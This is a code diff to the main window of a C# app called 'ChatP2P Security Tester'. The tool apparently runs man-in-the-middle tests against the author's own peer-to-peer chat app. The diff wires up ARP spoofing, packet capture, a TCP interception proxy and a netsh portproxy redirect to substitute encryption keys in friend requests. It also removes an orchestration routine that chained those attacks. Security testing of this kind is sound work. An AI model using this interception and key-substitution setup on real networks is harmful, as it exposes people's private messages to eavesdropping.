@@ -21,7 +21,6 @@ namespace ChatP2P.SecurityTester
         private TCPProxy? _tcpProxy;
 
         private ObservableCollection<CapturedPacket> _capturedPackets = new();
-        private ObservableCollection<AttackResult> _attackResults = new();
         private ObservableCollection<InterceptedConversation> _interceptedConversations = new();
 
         public MainWindow()
@@ -34,7 +33,6 @@ namespace ChatP2P.SecurityTester
         {
             // Initialize data grids
             dgCapturedPackets.ItemsSource = _capturedPackets;
-            dgAttackResults.ItemsSource = _attackResults;
             dgInterceptedConversations.ItemsSource = _interceptedConversations;
 
             // Initialize attack modules
@@ -44,6 +42,9 @@ namespace ChatP2P.SecurityTester
             _keyAttack = new KeySubstitutionAttack();
             _completeScenario = new CompleteScenarioAttack();
             _tcpProxy = new TCPProxy(_keyAttack);
+
+            // Initialize UI with SecurityTesterConfig values
+            InitializeUIFromConfig();
 
             // Initialize port forwarding UI with auto-detected attacker IP
             _ = Task.Run(async () => await AutoDetectAttackerIP());
@@ -73,11 +74,25 @@ namespace ChatP2P.SecurityTester
             // Load network interfaces
             RefreshNetworkInterfaces();
 
-            // Update configuration from UI
-            UpdateConfigurationFromUI();
-
             AppendLog("🕷️ ChatP2P Security Tester initialized");
             AppendLog("⚠️ Use only for authorized security testing!");
+            AppendLog($"📋 Config loaded: Target={SecurityTesterConfig.TargetClientIP}, Relay={SecurityTesterConfig.RelayServerIP}");
+        }
+
+        private void InitializeUIFromConfig()
+        {
+            // 📋 Auto-populate UI fields from SecurityTesterConfig
+            txtTargetClientIP.Text = SecurityTesterConfig.TargetClientIP;
+            txtRelayServerIP.Text = SecurityTesterConfig.RelayServerIP;
+
+            // 📋 Auto-populate Port Forwarding fields with intelligent defaults
+            txtTargetIP.Text = SecurityTesterConfig.TargetClientIP;   // For ARP spoofing target
+            txtConnectIP.Text = SecurityTesterConfig.RelayServerIP;   // For MITM attacks, connect to real relay
+
+            AppendLog("📋 UI initialized with SecurityTesterConfig defaults");
+            AppendLog($"   📍 Target Client: {SecurityTesterConfig.TargetClientIP}");
+            AppendLog($"   🛰️ Relay Server: {SecurityTesterConfig.RelayServerIP}");
+            AppendLog($"   🔧 Port Forwarding → Target IP: {txtTargetIP.Text}, Connect IP: {txtConnectIP.Text}");
         }
 
         private void UpdateConfigurationFromUI()
@@ -90,12 +105,13 @@ namespace ChatP2P.SecurityTester
         {
             try
             {
-                // Démarrer le proxy TCP qui écoute sur port 8889 local et redirige vers le vrai relay server
-                var targetIP = "192.168.1.152"; // IP du vrai relay server
+                // 🎯 Use SecurityTesterConfig values instead of hardcoded IPs
+                var targetIP = SecurityTesterConfig.RelayServerIP; // Real relay server from config
                 var targetPort = 8889; // Port du vrai relay server
-                var listenPort = 8889; // Port d'écoute local de l'attaquant
+                var listenPort = 8890; // Port d'écoute local TCPProxy (évite conflit portproxy)
 
                 AppendLog($"🔗 [TCP-PROXY] Starting proxy: localhost:{listenPort} → {targetIP}:{targetPort}");
+                AppendLog($"📋 [TCP-PROXY] Using Relay IP from config: {targetIP}");
                 AppendScenarioLog($"🔗 [TCP-PROXY] Starting proxy: localhost:{listenPort} → {targetIP}:{targetPort}");
 
                 var success = await _tcpProxy!.StartProxy(listenPort, targetIP, targetPort);
@@ -104,9 +120,10 @@ namespace ChatP2P.SecurityTester
                 {
                     AppendLog($"✅ [TCP-PROXY] Proxy started successfully on port {listenPort}");
                     AppendLog($"🎯 [TCP-PROXY] All client connections to port {listenPort} will be intercepted and forwarded");
+                    AppendLog($"⚠️ [DEBUG] TCPProxy should log '📡 Nouvelle connexion interceptée' when receiving traffic");
                     AppendScenarioLog($"✅ [TCP-PROXY] Proxy started successfully on port {listenPort}");
                     AppendScenarioLog($"🎯 [TCP-PROXY] Ready to intercept friend requests and substitute keys");
-                    AppendScenarioLog($"📋 [INSTRUCTIONS] Configure ChatP2P Client to connect to 192.168.1.145:8889");
+                    AppendScenarioLog($"📋 [STEP SUIVANT] Maintenant configurer Windows portproxy avec 'Add Port Proxy'");
                 }
                 else
                 {
@@ -192,7 +209,7 @@ namespace ChatP2P.SecurityTester
         {
             Dispatcher.BeginInvoke(() =>
             {
-                _attackResults.Insert(0, result);
+                // _attackResults.Insert(0, result); // Removed with Attack Orchestration tab
                 AppendLog($"🎯 Attack Result: {result.Summary}");
             });
         }
@@ -210,7 +227,7 @@ namespace ChatP2P.SecurityTester
                 AppendScenarioLog($"🛡️ [IMPACT] ChatP2P client will now use attacker's keys for encryption");
 
                 // Add to attack results
-                _attackResults.Insert(0, result);
+                // _attackResults.Insert(0, result); // Removed with Attack Orchestration tab
             });
         }
 
@@ -218,7 +235,13 @@ namespace ChatP2P.SecurityTester
         private void BtnUpdateTargets_Click(object sender, RoutedEventArgs e)
         {
             UpdateConfigurationFromUI();
+
+            // 🔄 Synchronize Port Forwarding fields with updated config
+            txtTargetIP.Text = SecurityTesterConfig.TargetClientIP;   // Update ARP target
+            txtConnectIP.Text = SecurityTesterConfig.RelayServerIP;   // Update MITM target
+
             AppendLog($"🎯 Target updated: Client={SecurityTesterConfig.TargetClientIP}, Relay={SecurityTesterConfig.RelayServerIP}");
+            AppendLog($"🔧 Port Forwarding auto-updated → Target IP: {txtTargetIP.Text}, Connect IP: {txtConnectIP.Text}");
         }
 
         private void BtnRefreshInterfaces_Click(object sender, RoutedEventArgs e)
@@ -418,126 +441,7 @@ namespace ChatP2P.SecurityTester
             }
         }
 
-        // Attack Orchestration Events
-        private async void BtnStartFullAttack_Click(object sender, RoutedEventArgs e)
-        {
-            try
-            {
-                txtOrchestrationStatus.Text = "Status: Starting full attack...";
-                AppendLog("🚀 Starting full MITM attack sequence");
-
-                // Step 1: Start packet capture
-                var selectedInterface = cmbInterfaces.SelectedItem?.ToString() ?? "";
-                var captureSuccess = await _packetCapture?.StartCapture(selectedInterface)!;
-
-                if (!captureSuccess)
-                {
-                    AppendLog("❌ Failed to start packet capture - aborting attack");
-                    return;
-                }
-
-                // Step 2: Start ARP spoofing
-                if (!IPAddress.TryParse(SecurityTesterConfig.TargetClientIP, out var targetIP))
-                {
-                    AppendLog("❌ Invalid target IP address - aborting attack");
-                    return;
-                }
-
-                var arpSuccess = await _arpSpoofer?.StartARPSpoofing(targetIP, null)!;
-
-                if (!arpSuccess)
-                {
-                    AppendLog("❌ Failed to start ARP spoofing - aborting attack");
-                    return;
-                }
-
-                // Step 3: Initialize attacker keys
-                var keySuccess = await _keyAttack?.InitializeAttackerKeys()!;
-
-                if (!keySuccess)
-                {
-                    AppendLog("❌ Failed to generate attacker keys - continuing without key substitution");
-                }
-
-                txtOrchestrationStatus.Text = "Status: Full attack active";
-                AppendLog("✅ Full MITM attack sequence started successfully");
-
-                // Update UI states
-                btnStartCapture.IsEnabled = false;
-                btnStopCapture.IsEnabled = true;
-                btnStartARP.IsEnabled = false;
-                btnStopARP.IsEnabled = true;
-                txtCaptureStatus.Text = "Status: Capturing...";
-                txtARPStatus.Text = "Status: Active";
-
-                if (keySuccess)
-                {
-                    var fingerprints = _keyAttack.GetAttackerFingerprints();
-                    txtAttackerFingerprints.Text = fingerprints;
-                    txtKeyAttackStatus.Text = "Status: Keys ready";
-                }
-            }
-            catch (Exception ex)
-            {
-                txtOrchestrationStatus.Text = "Status: Attack failed";
-                AppendLog($"❌ Error during full attack: {ex.Message}");
-            }
-        }
-
-        private void BtnStopAllAttacks_Click(object sender, RoutedEventArgs e)
-        {
-            try
-            {
-                AppendLog("⏹️ Stopping all attacks");
-
-                _packetCapture?.StopCapture();
-                _arpSpoofer?.StopARPSpoofing();
-
-                // Reset UI states
-                btnStartCapture.IsEnabled = true;
-                btnStopCapture.IsEnabled = false;
-                btnStartARP.IsEnabled = true;
-                btnStopARP.IsEnabled = false;
-                txtCaptureStatus.Text = "Status: Stopped";
-                txtARPStatus.Text = "Status: Stopped";
-                txtKeyAttackStatus.Text = "Status: Ready";
-                txtOrchestrationStatus.Text = "Status: Ready";
-
-                AppendLog("✅ All attacks stopped");
-            }
-            catch (Exception ex)
-            {
-                AppendLog($"❌ Error stopping attacks: {ex.Message}");
-            }
-        }
-
-        // Complete Scenario Events
-        private async void BtnStartCompleteScenario_Click(object sender, RoutedEventArgs e)
-        {
-            try
-            {
-                var targetIP = txtTargetClientIP.Text.Trim();
-                var relayIP = txtRelayServerIP.Text.Trim();
-
-                txtOrchestrationStatus.Text = "Status: Starting complete scenario...";
-                AppendLog($"🎯 Starting complete scenario: Target={targetIP}, Relay={relayIP}");
-
-                var success = await _completeScenario?.StartCompleteAttack(targetIP, relayIP)!;
-
-                if (success)
-                {
-                    txtOrchestrationStatus.Text = "Status: Complete scenario active";
-                }
-                else
-                {
-                    txtOrchestrationStatus.Text = "Status: Scenario failed";
-                }
-            }
-            catch (Exception ex)
-            {
-                AppendLog($"❌ Error starting complete scenario: {ex.Message}");
-            }
-        }
+        // Complete Scenario Events (Realistic Attack)
 
         private async void BtnStartRealisticScenario_Click(object sender, RoutedEventArgs e)
         {
@@ -854,10 +758,35 @@ namespace ChatP2P.SecurityTester
                     return;
                 }
 
-                AppendPortForwardingLog($"➕ Adding transparent proxy: 0.0.0.0:{listenPort} → {connectIP}:{listenPort}");
-                AppendPortForwardingLog($"   📡 ARP spoofed traffic will be captured on any interface and proxied to {connectIP}");
+                // 🎯 ARCHITECTURE MITM CORRECTE:
+                // 1. Windows Transparent Proxy: ARP spoofé → Local TCPProxy
+                // 2. TCPProxy C#: Interception + Relay vers vrai serveur
+                string targetIP;
+                if (listenPort == "8889") // Port ChatP2P Relay
+                {
+                    // Pour ChatP2P, rediriger vers le TCPProxy local qui fera l'interception
+                    targetIP = "127.0.0.1";
+                    AppendPortForwardingLog($"🕷️ ChatP2P MITM: ARP spoofé → TCPProxy(localhost) → Relay({connectIP})");
+                    AppendPortForwardingLog($"   📡 Le TCPProxy C# interceptera et modifiera les friend requests");
+                }
+                else
+                {
+                    // Pour autres ports, redirection directe
+                    targetIP = connectIP;
+                    AppendPortForwardingLog($"🌐 Standard proxy: {listenPort} → {connectIP}");
+                }
 
-                var command = $"netsh interface portproxy add v4tov4 listenport={listenPort} listenaddress=0.0.0.0 connectport={listenPort} connectaddress={connectIP}";
+                // 🎯 MITM SPECIAL CASE: Port 8889 redirects to TCPProxy on port 8890
+                var connectPort = (listenPort == "8889") ? "8890" : listenPort;
+
+                AppendPortForwardingLog($"➕ Adding transparent proxy: 0.0.0.0:{listenPort} → {targetIP}:{connectPort}");
+                AppendPortForwardingLog($"   📡 ARP spoofed traffic will be captured on any interface and proxied to {targetIP}");
+                if (listenPort == "8889")
+                {
+                    AppendPortForwardingLog($"   🕷️ MITM: Port 8889 → TCPProxy(8890) for key substitution attacks");
+                }
+
+                var command = $"netsh interface portproxy add v4tov4 listenport={listenPort} listenaddress=0.0.0.0 connectport={connectPort} connectaddress={targetIP}";
                 var result = await ExecuteNetshCommand(command, "Add transparent proxy");
 
                 if (result)
@@ -866,6 +795,11 @@ namespace ChatP2P.SecurityTester
                     var activeProxies = await GetActivePortProxies();
                     txtActiveProxies.Text = activeProxies.ToString();
                     AppendPortForwardingLog("✅ Transparent proxy added successfully");
+
+                    if (listenPort == "8889")
+                    {
+                        AppendPortForwardingLog("🎯 IMPORTANT: Ensure TCPProxy is running on port 8889 for MITM interception!");
+                    }
                 }
                 else
                 {
